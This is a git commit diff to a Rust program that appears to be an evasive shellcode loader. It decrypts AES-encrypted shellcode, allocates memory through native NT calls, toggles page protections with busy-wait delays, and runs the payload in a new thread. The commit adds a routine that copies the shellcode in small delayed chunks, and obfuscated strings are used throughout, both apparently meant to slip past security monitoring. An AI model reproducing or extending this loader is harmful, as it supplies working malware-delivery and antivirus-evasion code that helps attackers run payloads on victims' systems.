d6d65d023933961aa9ddcc40587774254f595a1c
Daniil Nababkin <nababkind@protonmail.com>
2021-11-01 17:09:34 +0200

    Gradually writing the shellcode mixed with sleeps instead of loading it all at once.

--- src/main.rs
+++ src/main.rs
@@ -1,4 +1,3 @@
-#![feature(asm)]
 use std::env;
 use aes::{Aes128};
 use cfb_mode::Cfb;
@@ -6,9 +5,6 @@ use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
 use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
 use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
 use obfstr::obfstr;
-
-#[cfg(debug_assertions)]
-use std::time::{Instant};
 
 type Aes128Cfb = Cfb<Aes128>;
 
@@ -25,19 +21,37 @@ impl Injector {
         unsafe {
             let mut protect = PAGE_NOACCESS.0;
             let mut map_ptr: *mut c_void = std::ptr::null_mut();
-            let mut sc_len = self.shellcode.len() * 5;
+            // asking for more than needed, because we can afford it
+            let mut sc_len = self.shellcode.len() * 100;
             NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut sc_len, MEM_COMMIT.0 | MEM_RESERVE.0, protect);
-            custom_sleep();
+            custom_sleep(100);
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_READWRITE.0, &mut protect);
-            custom_sleep();
-            std::ptr::copy_nonoverlapping(self.shellcode.as_ptr(), map_ptr as *mut u8, self.shellcode.len());
+            custom_sleep(100);
+            self.copy_nonoverlapping_gradually(map_ptr as *mut u8);
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_NOACCESS.0, &mut protect);
-            custom_sleep();
+            custom_sleep(100);
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_EXECUTE.0, &mut protect);
-            custom_sleep();
+            custom_sleep(100);
             let mut thread_handle : *mut c_void = std::ptr::null_mut();
             NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, map_ptr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
             NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
+        }
+    }
+
+    fn copy_nonoverlapping_gradually(&mut self, map_ptr: *mut u8) {
+        unsafe {
+            let sc_ptr = self.shellcode.as_ptr();
+            let mut i = 0;
+            while i < self.shellcode.len()+33 {
+                std::ptr::copy_nonoverlapping(sc_ptr.offset(i as isize), map_ptr.offset(i as isize), 32);
+                i += 32;
+                #[cfg(debug_assertions)]
+                if i % 3200 == 0 || i > self.shellcode.len()
+                {
+                    println!("{}{}{}{}{}", obfstr!("[+] [total written] ["), i, obfstr!("B/"), self.shellcode.len(), obfstr!("B]"));
+                }
+                custom_sleep(2);
+            }
         }
     }
 }
@@ -58,22 +72,16 @@ fn decrypt_shellcode_stub() -> Vec<u8> {
     buf
 }
 
-fn custom_sleep() {
-    #[cfg(debug_assertions)]
-    let now = Instant::now();
-
-    for _ in 0..100 {
-        for _ in 0..100 {
-            for _ in 0..100 {
-                for _ in 0..100 {
+fn custom_sleep(delay: u8) {
+    for _ in 0..delay {
+        for _ in 0..10 {
+            for _ in 0..10 {
+                for _ in 0..10 {
                     print!("{}", obfstr!(""));
                 }
             }
         }
     }
-
-    #[cfg(debug_assertions)]
-    println!("{} {} {}", obfstr!("el@ps3d:"), now.elapsed().as_millis(), obfstr!("ms."));
 }
 
 fn main() {
